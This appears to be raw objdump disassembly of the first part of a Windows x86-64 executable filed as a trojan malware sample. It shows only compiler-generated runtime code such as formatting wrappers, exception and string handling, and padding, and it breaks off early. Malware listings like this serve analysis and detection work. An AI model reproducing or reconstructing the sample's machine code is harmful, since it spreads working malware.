
malware_samples/trojan/0a1eb4edd49c4e283f32a5ca4963ea3c308ee4e894d294bfed3d8f5d7c38fbe0.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	48 8d 0d 35 7a 04 00 	lea    0x47a35(%rip),%rcx        # 0x140048a40
   14000100b:	e8 00 77 00 00       	call   0x140008710
   140001010:	48 8d 0d c9 e0 02 00 	lea    0x2e0c9(%rip),%rcx        # 0x14002f0e0
   140001017:	48 83 c4 28          	add    $0x28,%rsp
   14000101b:	e9 5c 93 00 00       	jmp    0x14000a37c
   140001020:	48 8d 0d 21 e1 02 00 	lea    0x2e121(%rip),%rcx        # 0x14002f148
   140001027:	e9 50 93 00 00       	jmp    0x14000a37c
   14000102c:	48 8d 0d b9 e0 02 00 	lea    0x2e0b9(%rip),%rcx        # 0x14002f0ec
   140001033:	e9 44 93 00 00       	jmp    0x14000a37c
   140001038:	48 83 ec 28          	sub    $0x28,%rsp
   14000103c:	48 8d 0d bd 7f 04 00 	lea    0x47fbd(%rip),%rcx        # 0x140049000
   140001043:	e8 c8 76 00 00       	call   0x140008710
   140001048:	48 8d 0d 79 e1 02 00 	lea    0x2e179(%rip),%rcx        # 0x14002f1c8
   14000104f:	48 83 c4 28          	add    $0x28,%rsp
   140001053:	e9 24 93 00 00       	jmp    0x14000a37c
   140001058:	48 8d 0d 29 e1 02 00 	lea    0x2e129(%rip),%rcx        # 0x14002f188
   14000105f:	e9 18 93 00 00       	jmp    0x14000a37c
   140001064:	cc                   	int3
   140001065:	cc                   	int3
   140001066:	cc                   	int3
   140001067:	cc                   	int3
   140001068:	cc                   	int3
   140001069:	cc                   	int3
   14000106a:	cc                   	int3
   14000106b:	cc                   	int3
   14000106c:	cc                   	int3
   14000106d:	cc                   	int3
   14000106e:	cc                   	int3
   14000106f:	cc                   	int3
   140001070:	48 8d 05 81 95 04 00 	lea    0x49581(%rip),%rax        # 0x14004a5f8
   140001077:	c3                   	ret
   140001078:	cc                   	int3
   140001079:	cc                   	int3
   14000107a:	cc                   	int3
   14000107b:	cc                   	int3
   14000107c:	cc                   	int3
   14000107d:	cc                   	int3
   14000107e:	cc                   	int3
   14000107f:	cc                   	int3
   140001080:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001085:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000108a:	53                   	push   %rbx
   14000108b:	55                   	push   %rbp
   14000108c:	56                   	push   %rsi
   14000108d:	57                   	push   %rdi
   14000108e:	48 83 ec 38          	sub    $0x38,%rsp
   140001092:	49 8b f0             	mov    %r8,%rsi
   140001095:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   14000109a:	48 8b da             	mov    %rdx,%rbx
   14000109d:	48 8b f9             	mov    %rcx,%rdi
   1400010a0:	e8 cb ff ff ff       	call   0x140001070
   1400010a5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400010aa:	4c 8b ce             	mov    %rsi,%r9
   1400010ad:	4c 8b c3             	mov    %rbx,%r8
   1400010b0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400010b7:	00 00 
   1400010b9:	48 8b d7             	mov    %rdi,%rdx
   1400010bc:	48 8b 08             	mov    (%rax),%rcx
   1400010bf:	e8 58 1b 01 00       	call   0x140012c1c
   1400010c4:	85 c0                	test   %eax,%eax
   1400010c6:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400010cb:	0f 48 c1             	cmovs  %ecx,%eax
   1400010ce:	48 83 c4 38          	add    $0x38,%rsp
   1400010d2:	5f                   	pop    %rdi
   1400010d3:	5e                   	pop    %rsi
   1400010d4:	5d                   	pop    %rbp
   1400010d5:	5b                   	pop    %rbx
   1400010d6:	c3                   	ret
   1400010d7:	cc                   	int3
   1400010d8:	cc                   	int3
   1400010d9:	cc                   	int3
   1400010da:	cc                   	int3
   1400010db:	cc                   	int3
   1400010dc:	cc                   	int3
   1400010dd:	cc                   	int3
   1400010de:	cc                   	int3
   1400010df:	cc                   	int3
   1400010e0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400010e5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400010ea:	53                   	push   %rbx
   1400010eb:	55                   	push   %rbp
   1400010ec:	56                   	push   %rsi
   1400010ed:	57                   	push   %rdi
   1400010ee:	48 83 ec 38          	sub    $0x38,%rsp
   1400010f2:	49 8b f0             	mov    %r8,%rsi
   1400010f5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1400010fa:	48 8b da             	mov    %rdx,%rbx
   1400010fd:	48 8b f9             	mov    %rcx,%rdi
   140001100:	e8 6b ff ff ff       	call   0x140001070
   140001105:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   14000110a:	4c 8b ce             	mov    %rsi,%r9
   14000110d:	4c 8b c3             	mov    %rbx,%r8
   140001110:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001117:	00 00 
   140001119:	48 8b d7             	mov    %rdi,%rdx
   14000111c:	48 8b 08             	mov    (%rax),%rcx
   14000111f:	48 83 c9 01          	or     $0x1,%rcx
   140001123:	e8 98 18 01 00       	call   0x1400129c0
   140001128:	85 c0                	test   %eax,%eax
   14000112a:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000112f:	0f 48 c1             	cmovs  %ecx,%eax
   140001132:	48 83 c4 38          	add    $0x38,%rsp
   140001136:	5f                   	pop    %rdi
   140001137:	5e                   	pop    %rsi
   140001138:	5d                   	pop    %rbp
   140001139:	5b                   	pop    %rbx
   14000113a:	c3                   	ret
   14000113b:	cc                   	int3
   14000113c:	cc                   	int3
   14000113d:	cc                   	int3
   14000113e:	cc                   	int3
   14000113f:	cc                   	int3
   140001140:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001145:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000114a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000114f:	53                   	push   %rbx
   140001150:	56                   	push   %rsi
   140001151:	57                   	push   %rdi
   140001152:	48 83 ec 30          	sub    $0x30,%rsp
   140001156:	48 8b da             	mov    %rdx,%rbx
   140001159:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   14000115e:	48 8b f9             	mov    %rcx,%rdi
   140001161:	e8 0a ff ff ff       	call   0x140001070
   140001166:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   14000116b:	4c 8b cb             	mov    %rbx,%r9
   14000116e:	41 b8 ff ff ff 7f    	mov    $0x7fffffff,%r8d
   140001174:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000117b:	00 00 
   14000117d:	48 8b d7             	mov    %rdi,%rdx
   140001180:	48 8b 08             	mov    (%rax),%rcx
   140001183:	e8 38 18 01 00       	call   0x1400129c0
   140001188:	85 c0                	test   %eax,%eax
   14000118a:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000118f:	0f 48 c1             	cmovs  %ecx,%eax
   140001192:	48 83 c4 30          	add    $0x30,%rsp
   140001196:	5f                   	pop    %rdi
   140001197:	5e                   	pop    %rsi
   140001198:	5b                   	pop    %rbx
   140001199:	c3                   	ret
   14000119a:	cc                   	int3
   14000119b:	cc                   	int3
   14000119c:	cc                   	int3
   14000119d:	cc                   	int3
   14000119e:	cc                   	int3
   14000119f:	cc                   	int3
   1400011a0:	40 53                	rex push %rbx
   1400011a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400011a6:	48 8b d9             	mov    %rcx,%rbx
   1400011a9:	48 8b c2             	mov    %rdx,%rax
   1400011ac:	48 8d 0d 8d f4 02 00 	lea    0x2f48d(%rip),%rcx        # 0x140030640
   1400011b3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400011b6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400011ba:	48 89 0b             	mov    %rcx,(%rbx)
   1400011bd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400011c1:	0f 11 02             	movups %xmm0,(%rdx)
   1400011c4:	e8 ff a7 00 00       	call   0x14000b9c8
   1400011c9:	48 8b c3             	mov    %rbx,%rax
   1400011cc:	48 83 c4 20          	add    $0x20,%rsp
   1400011d0:	5b                   	pop    %rbx
   1400011d1:	c3                   	ret
   1400011d2:	cc                   	int3
   1400011d3:	cc                   	int3
   1400011d4:	cc                   	int3
   1400011d5:	cc                   	int3
   1400011d6:	cc                   	int3
   1400011d7:	cc                   	int3
   1400011d8:	cc                   	int3
   1400011d9:	cc                   	int3
   1400011da:	cc                   	int3
   1400011db:	cc                   	int3
   1400011dc:	cc                   	int3
   1400011dd:	cc                   	int3
   1400011de:	cc                   	int3
   1400011df:	cc                   	int3
   1400011e0:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1400011e4:	48 8d 05 ed d4 03 00 	lea    0x3d4ed(%rip),%rax        # 0x14003e6d8
   1400011eb:	48 85 d2             	test   %rdx,%rdx
   1400011ee:	48 0f 45 c2          	cmovne %rdx,%rax
   1400011f2:	c3                   	ret
   1400011f3:	cc                   	int3
   1400011f4:	cc                   	int3
   1400011f5:	cc                   	int3
   1400011f6:	cc                   	int3
   1400011f7:	cc                   	int3
   1400011f8:	cc                   	int3
   1400011f9:	cc                   	int3
   1400011fa:	cc                   	int3
   1400011fb:	cc                   	int3
   1400011fc:	cc                   	int3
   1400011fd:	cc                   	int3
   1400011fe:	cc                   	int3
   1400011ff:	cc                   	int3
   140001200:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001205:	57                   	push   %rdi
   140001206:	48 83 ec 20          	sub    $0x20,%rsp
   14000120a:	48 8d 05 2f f4 02 00 	lea    0x2f42f(%rip),%rax        # 0x140030640
   140001211:	48 8b f9             	mov    %rcx,%rdi
   140001214:	48 89 01             	mov    %rax,(%rcx)
   140001217:	8b da                	mov    %edx,%ebx
   140001219:	48 83 c1 08          	add    $0x8,%rcx
   14000121d:	e8 36 a8 00 00       	call   0x14000ba58
   140001222:	f6 c3 01             	test   $0x1,%bl
   140001225:	74 0d                	je     0x140001234
   140001227:	ba 18 00 00 00       	mov    $0x18,%edx
   14000122c:	48 8b cf             	mov    %rdi,%rcx
   14000122f:	e8 2c 8c 00 00       	call   0x140009e60
   140001234:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001239:	48 8b c7             	mov    %rdi,%rax
   14000123c:	48 83 c4 20          	add    $0x20,%rsp
   140001240:	5f                   	pop    %rdi
   140001241:	c3                   	ret
   140001242:	cc                   	int3
   140001243:	cc                   	int3
   140001244:	cc                   	int3
   140001245:	cc                   	int3
   140001246:	cc                   	int3
   140001247:	cc                   	int3
   140001248:	cc                   	int3
   140001249:	cc                   	int3
   14000124a:	cc                   	int3
   14000124b:	cc                   	int3
   14000124c:	cc                   	int3
   14000124d:	cc                   	int3
   14000124e:	cc                   	int3
   14000124f:	cc                   	int3
   140001250:	48 8d 05 e9 f3 02 00 	lea    0x2f3e9(%rip),%rax        # 0x140030640
   140001257:	48 89 01             	mov    %rax,(%rcx)
   14000125a:	48 83 c1 08          	add    $0x8,%rcx
   14000125e:	e9 f5 a7 00 00       	jmp    0x14000ba58
   140001263:	cc                   	int3
   140001264:	cc                   	int3
   140001265:	cc                   	int3
   140001266:	cc                   	int3
   140001267:	cc                   	int3
   140001268:	cc                   	int3
   140001269:	cc                   	int3
   14000126a:	cc                   	int3
   14000126b:	cc                   	int3
   14000126c:	cc                   	int3
   14000126d:	cc                   	int3
   14000126e:	cc                   	int3
   14000126f:	cc                   	int3
   140001270:	48 8d 05 79 d4 03 00 	lea    0x3d479(%rip),%rax        # 0x14003e6f0
   140001277:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000127e:	00 
   14000127f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001283:	48 8d 05 e6 f3 02 00 	lea    0x2f3e6(%rip),%rax        # 0x140030670
   14000128a:	48 89 01             	mov    %rax,(%rcx)
   14000128d:	48 8b c1             	mov    %rcx,%rax
   140001290:	c3                   	ret
   140001291:	cc                   	int3
   140001292:	cc                   	int3
   140001293:	cc                   	int3
   140001294:	cc                   	int3
   140001295:	cc                   	int3
   140001296:	cc                   	int3
   140001297:	cc                   	int3
   140001298:	cc                   	int3
   140001299:	cc                   	int3
   14000129a:	cc                   	int3
   14000129b:	cc                   	int3
   14000129c:	cc                   	int3
   14000129d:	cc                   	int3
   14000129e:	cc                   	int3
   14000129f:	cc                   	int3
   1400012a0:	48 83 ec 48          	sub    $0x48,%rsp
   1400012a4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400012a9:	e8 c2 ff ff ff       	call   0x140001270
   1400012ae:	48 8d 15 3b 30 04 00 	lea    0x4303b(%rip),%rdx        # 0x1400442f0
   1400012b5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400012ba:	e8 4d a9 00 00       	call   0x14000bc0c
   1400012bf:	cc                   	int3
   1400012c0:	40 53                	rex push %rbx
   1400012c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400012c6:	48 8b d9             	mov    %rcx,%rbx
   1400012c9:	48 8b c2             	mov    %rdx,%rax
   1400012cc:	48 8d 0d 6d f3 02 00 	lea    0x2f36d(%rip),%rcx        # 0x140030640
   1400012d3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400012d6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400012da:	48 89 0b             	mov    %rcx,(%rbx)
   1400012dd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400012e1:	0f 11 02             	movups %xmm0,(%rdx)
   1400012e4:	e8 df a6 00 00       	call   0x14000b9c8
   1400012e9:	48 8d 05 80 f3 02 00 	lea    0x2f380(%rip),%rax        # 0x140030670
   1400012f0:	48 89 03             	mov    %rax,(%rbx)
   1400012f3:	48 8b c3             	mov    %rbx,%rax
   1400012f6:	48 83 c4 20          	add    $0x20,%rsp
   1400012fa:	5b                   	pop    %rbx
   1400012fb:	c3                   	ret
   1400012fc:	cc                   	int3
   1400012fd:	cc                   	int3
   1400012fe:	cc                   	int3
   1400012ff:	cc                   	int3
   140001300:	40 53                	rex push %rbx
   140001302:	48 83 ec 20          	sub    $0x20,%rsp
   140001306:	48 8b d9             	mov    %rcx,%rbx
   140001309:	48 8b c2             	mov    %rdx,%rax
   14000130c:	48 8d 0d 2d f3 02 00 	lea    0x2f32d(%rip),%rcx        # 0x140030640
   140001313:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001316:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000131a:	48 89 0b             	mov    %rcx,(%rbx)
   14000131d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001321:	0f 11 02             	movups %xmm0,(%rdx)
   140001324:	e8 9f a6 00 00       	call   0x14000b9c8
   140001329:	48 8d 05 28 f3 02 00 	lea    0x2f328(%rip),%rax        # 0x140030658
   140001330:	48 89 03             	mov    %rax,(%rbx)
   140001333:	48 8b c3             	mov    %rbx,%rax
   140001336:	48 83 c4 20          	add    $0x20,%rsp
   14000133a:	5b                   	pop    %rbx
   14000133b:	c3                   	ret
   14000133c:	cc                   	int3
   14000133d:	cc                   	int3
   14000133e:	cc                   	int3
   14000133f:	cc                   	int3
   140001340:	48 83 ec 28          	sub    $0x28,%rsp
   140001344:	48 8d 0d bd d3 03 00 	lea    0x3d3bd(%rip),%rcx        # 0x14003e708
   14000134b:	e8 a0 77 00 00       	call   0x140008af0
   140001350:	cc                   	int3
   140001351:	cc                   	int3
   140001352:	cc                   	int3
   140001353:	cc                   	int3
   140001354:	cc                   	int3
   140001355:	cc                   	int3
   140001356:	cc                   	int3
   140001357:	cc                   	int3
   140001358:	cc                   	int3
   140001359:	cc                   	int3
   14000135a:	cc                   	int3
   14000135b:	cc                   	int3
   14000135c:	cc                   	int3
   14000135d:	cc                   	int3
   14000135e:	cc                   	int3
   14000135f:	cc                   	int3
   140001360:	40 53                	rex push %rbx
   140001362:	48 83 ec 20          	sub    $0x20,%rsp
   140001366:	48 8b d9             	mov    %rcx,%rbx
   140001369:	48 8b c2             	mov    %rdx,%rax
   14000136c:	48 8d 0d cd f2 02 00 	lea    0x2f2cd(%rip),%rcx        # 0x140030640
   140001373:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001376:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000137a:	48 89 0b             	mov    %rcx,(%rbx)
   14000137d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001381:	0f 11 02             	movups %xmm0,(%rdx)
   140001384:	e8 3f a6 00 00       	call   0x14000b9c8
   140001389:	48 8d 05 f8 f2 02 00 	lea    0x2f2f8(%rip),%rax        # 0x140030688
   140001390:	48 89 03             	mov    %rax,(%rbx)
   140001393:	48 8b c3             	mov    %rbx,%rax
   140001396:	48 83 c4 20          	add    $0x20,%rsp
   14000139a:	5b                   	pop    %rbx
   14000139b:	c3                   	ret
   14000139c:	cc                   	int3
   14000139d:	cc                   	int3
   14000139e:	cc                   	int3
   14000139f:	cc                   	int3
   1400013a0:	44 89 02             	mov    %r8d,(%rdx)
   1400013a3:	48 8b c2             	mov    %rdx,%rax
   1400013a6:	48 89 4a 08          	mov    %rcx,0x8(%rdx)
   1400013aa:	c3                   	ret
   1400013ab:	cc                   	int3
   1400013ac:	cc                   	int3
   1400013ad:	cc                   	int3
   1400013ae:	cc                   	int3
   1400013af:	cc                   	int3
   1400013b0:	40 53                	rex push %rbx
   1400013b2:	48 83 ec 30          	sub    $0x30,%rsp
   1400013b6:	48 8b 01             	mov    (%rcx),%rax
   1400013b9:	49 8b d8             	mov    %r8,%rbx
   1400013bc:	44 8b c2             	mov    %edx,%r8d
   1400013bf:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400013c4:	ff 50 18             	call   *0x18(%rax)
   1400013c7:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400013cb:	4c 8b 48 08          	mov    0x8(%rax),%r9
   1400013cf:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1400013d3:	49 39 51 08          	cmp    %rdx,0x8(%r9)
   1400013d7:	75 0e                	jne    0x1400013e7
   1400013d9:	8b 0b                	mov    (%rbx),%ecx
   1400013db:	39 08                	cmp    %ecx,(%rax)
   1400013dd:	75 08                	jne    0x1400013e7
   1400013df:	b0 01                	mov    $0x1,%al
   1400013e1:	48 83 c4 30          	add    $0x30,%rsp
   1400013e5:	5b                   	pop    %rbx
   1400013e6:	c3                   	ret
   1400013e7:	32 c0                	xor    %al,%al
   1400013e9:	48 83 c4 30          	add    $0x30,%rsp
   1400013ed:	5b                   	pop    %rbx
   1400013ee:	c3                   	ret
   1400013ef:	cc                   	int3
   1400013f0:	48 8b 42 08          	mov    0x8(%rdx),%rax
   1400013f4:	4c 8b 48 08          	mov    0x8(%rax),%r9
   1400013f8:	4c 39 49 08          	cmp    %r9,0x8(%rcx)
   1400013fc:	75 08                	jne    0x140001406
   1400013fe:	44 39 02             	cmp    %r8d,(%rdx)
   140001401:	75 03                	jne    0x140001406
   140001403:	b0 01                	mov    $0x1,%al
   140001405:	c3                   	ret
   140001406:	32 c0                	xor    %al,%al
   140001408:	c3                   	ret
   140001409:	cc                   	int3
   14000140a:	cc                   	int3
   14000140b:	cc                   	int3
   14000140c:	cc                   	int3
   14000140d:	cc                   	int3
   14000140e:	cc                   	int3
   14000140f:	cc                   	int3
   140001410:	48 8d 05 59 70 04 00 	lea    0x47059(%rip),%rax        # 0x140048470
   140001417:	c7 01 01 00 00 00    	movl   $0x1,(%rcx)
   14000141d:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001421:	48 8b c1             	mov    %rcx,%rax
   140001424:	c3                   	ret
   140001425:	cc                   	int3
   140001426:	cc                   	int3
   140001427:	cc                   	int3
   140001428:	cc                   	int3
   140001429:	cc                   	int3
   14000142a:	cc                   	int3
   14000142b:	cc                   	int3
   14000142c:	cc                   	int3
   14000142d:	cc                   	int3
   14000142e:	cc                   	int3
   14000142f:	cc                   	int3
   140001430:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001435:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000143a:	55                   	push   %rbp
   14000143b:	57                   	push   %rdi
   14000143c:	41 54                	push   %r12
   14000143e:	41 56                	push   %r14
   140001440:	41 57                	push   %r15
   140001442:	48 8b ec             	mov    %rsp,%rbp
   140001445:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000144c:	49 8b f8             	mov    %r8,%rdi
   14000144f:	4c 8b fa             	mov    %rdx,%r15
   140001452:	4c 8b f1             	mov    %rcx,%r14
   140001455:	45 33 e4             	xor    %r12d,%r12d
   140001458:	4c 89 65 c0          	mov    %r12,-0x40(%rbp)
   14000145c:	4c 89 65 d0          	mov    %r12,-0x30(%rbp)
   140001460:	4c 89 65 d8          	mov    %r12,-0x28(%rbp)
   140001464:	49 8b 70 10          	mov    0x10(%r8),%rsi
   140001468:	49 83 78 18 10       	cmpq   $0x10,0x18(%r8)
   14000146d:	72 03                	jb     0x140001472
   14000146f:	49 8b 38             	mov    (%r8),%rdi
   140001472:	48 83 fe 10          	cmp    $0x10,%rsi
   140001476:	73 0e                	jae    0x140001486
   140001478:	0f 10 07             	movups (%rdi),%xmm0
   14000147b:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   14000147f:	bb 0f 00 00 00       	mov    $0xf,%ebx
   140001484:	eb 76                	jmp    0x1400014fc
   140001486:	48 8b de             	mov    %rsi,%rbx
   140001489:	48 83 cb 0f          	or     $0xf,%rbx
   14000148d:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140001494:	ff ff 7f 
   140001497:	48 3b d8             	cmp    %rax,%rbx
   14000149a:	48 0f 47 d8          	cmova  %rax,%rbx
   14000149e:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   1400014a2:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   1400014a9:	72 2f                	jb     0x1400014da
   1400014ab:	48 8d 41 27          	lea    0x27(%rcx),%rax
   1400014af:	48 3b c1             	cmp    %rcx,%rax
   1400014b2:	0f 86 ba 01 00 00    	jbe    0x140001672
   1400014b8:	48 8b c8             	mov    %rax,%rcx
   1400014bb:	e8 a8 89 00 00       	call   0x140009e68
   1400014c0:	48 8b c8             	mov    %rax,%rcx
   1400014c3:	48 85 c0             	test   %rax,%rax
   1400014c6:	0f 84 a0 01 00 00    	je     0x14000166c
   1400014cc:	48 83 c0 27          	add    $0x27,%rax
   1400014d0:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   1400014d4:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   1400014d8:	eb 0f                	jmp    0x1400014e9
   1400014da:	48 85 c9             	test   %rcx,%rcx
   1400014dd:	74 07                	je     0x1400014e6
   1400014df:	e8 84 89 00 00       	call   0x140009e68
   1400014e4:	eb 03                	jmp    0x1400014e9
   1400014e6:	49 8b c4             	mov    %r12,%rax
   1400014e9:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   1400014ed:	4c 8d 46 01          	lea    0x1(%rsi),%r8
   1400014f1:	48 8b d7             	mov    %rdi,%rdx
   1400014f4:	48 8b c8             	mov    %rax,%rcx
   1400014f7:	e8 e4 a7 00 00       	call   0x14000bce0
   1400014fc:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
   140001500:	48 89 5d d8          	mov    %rbx,-0x28(%rbp)
   140001504:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140001508:	48 89 45 40          	mov    %rax,0x40(%rbp)
   14000150c:	41 0f 10 07          	movups (%r15),%xmm0
   140001510:	0f 29 45 a0          	movaps %xmm0,-0x60(%rbp)
   140001514:	48 85 f6             	test   %rsi,%rsi
   140001517:	74 16                	je     0x14000152f
   140001519:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000151f:	48 8d 15 f2 d1 03 00 	lea    0x3d1f2(%rip),%rdx        # 0x14003e718
   140001526:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000152a:	e8 81 54 00 00       	call   0x1400069b0
   14000152f:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
   140001533:	48 8b 01             	mov    (%rcx),%rax
   140001536:	44 8b 45 a0          	mov    -0x60(%rbp),%r8d
   14000153a:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   14000153e:	ff 50 10             	call   *0x10(%rax)
   140001541:	90                   	nop
   140001542:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140001546:	48 83 7d b8 10       	cmpq   $0x10,-0x48(%rbp)
   14000154b:	48 0f 43 55 a0       	cmovae -0x60(%rbp),%rdx
   140001550:	4c 8b 45 b0          	mov    -0x50(%rbp),%r8
   140001554:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140001558:	e8 53 54 00 00       	call   0x1400069b0
   14000155d:	90                   	nop
   14000155e:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
   140001562:	48 83 fa 10          	cmp    $0x10,%rdx
   140001566:	72 31                	jb     0x140001599
   140001568:	48 ff c2             	inc    %rdx
   14000156b:	48 8b 4d a0          	mov    -0x60(%rbp),%rcx
   14000156f:	48 8b c1             	mov    %rcx,%rax
   140001572:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001579:	72 19                	jb     0x140001594
   14000157b:	48 83 c2 27          	add    $0x27,%rdx
   14000157f:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001583:	48 2b c1             	sub    %rcx,%rax
   140001586:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   14000158a:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000158e:	0f 87 e4 00 00 00    	ja     0x140001678
   140001594:	e8 c7 88 00 00       	call   0x140009e60
   140001599:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   14000159d:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   1400015a1:	0f 10 4d d0          	movups -0x30(%rbp),%xmm1
   1400015a5:	0f 11 4d f0          	movups %xmm1,-0x10(%rbp)
   1400015a9:	4c 89 65 d0          	mov    %r12,-0x30(%rbp)
   1400015ad:	48 c7 45 d8 0f 00 00 	movq   $0xf,-0x28(%rbp)
   1400015b4:	00 
   1400015b5:	c6 45 c0 00          	movb   $0x0,-0x40(%rbp)
   1400015b9:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400015bd:	66 48 0f 7e c1       	movq   %xmm0,%rcx
   1400015c2:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   1400015c7:	66 48 0f 7e c8       	movq   %xmm1,%rax
   1400015cc:	48 83 f8 10          	cmp    $0x10,%rax
   1400015d0:	4c 0f 43 c1          	cmovae %rcx,%r8
   1400015d4:	48 8d 05 65 f0 02 00 	lea    0x2f065(%rip),%rax        # 0x140030640
   1400015db:	49 89 06             	mov    %rax,(%r14)
   1400015de:	49 8d 56 08          	lea    0x8(%r14),%rdx
   1400015e2:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400015e5:	0f 11 02             	movups %xmm0,(%rdx)
   1400015e8:	4c 89 45 a0          	mov    %r8,-0x60(%rbp)
   1400015ec:	c6 45 a8 01          	movb   $0x1,-0x58(%rbp)
   1400015f0:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1400015f4:	e8 cf a3 00 00       	call   0x14000b9c8
   1400015f9:	48 8d 05 88 f0 02 00 	lea    0x2f088(%rip),%rax        # 0x140030688
   140001600:	49 89 06             	mov    %rax,(%r14)
   140001603:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140001607:	48 83 fa 10          	cmp    $0x10,%rdx
   14000160b:	72 2d                	jb     0x14000163a
   14000160d:	48 ff c2             	inc    %rdx
   140001610:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140001614:	48 8b c1             	mov    %rcx,%rax
   140001617:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000161e:	72 15                	jb     0x140001635
   140001620:	48 83 c2 27          	add    $0x27,%rdx
   140001624:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001628:	48 2b c1             	sub    %rcx,%rax
   14000162b:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   14000162f:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001633:	77 37                	ja     0x14000166c
   140001635:	e8 26 88 00 00       	call   0x140009e60
   14000163a:	48 8d 05 5f f0 02 00 	lea    0x2f05f(%rip),%rax        # 0x1400306a0
   140001641:	49 89 06             	mov    %rax,(%r14)
   140001644:	41 0f 10 07          	movups (%r15),%xmm0
   140001648:	41 0f 11 46 18       	movups %xmm0,0x18(%r14)
   14000164d:	49 8b c6             	mov    %r14,%rax
   140001650:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140001657:	00 
   140001658:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000165c:	49 8b 73 38          	mov    0x38(%r11),%rsi
   140001660:	49 8b e3             	mov    %r11,%rsp
   140001663:	41 5f                	pop    %r15
   140001665:	41 5e                	pop    %r14
   140001667:	41 5c                	pop    %r12
   140001669:	5f                   	pop    %rdi
   14000166a:	5d                   	pop    %rbp
   14000166b:	c3                   	ret
   14000166c:	e8 af 37 01 00       	call   0x140014e20
   140001671:	cc                   	int3
   140001672:	e8 29 fc ff ff       	call   0x1400012a0
   140001677:	90                   	nop
   140001678:	e8 a3 37 01 00       	call   0x140014e20
   14000167d:	90                   	nop
   14000167e:	cc                   	int3
   14000167f:	cc                   	int3
   140001680:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001685:	57                   	push   %rdi
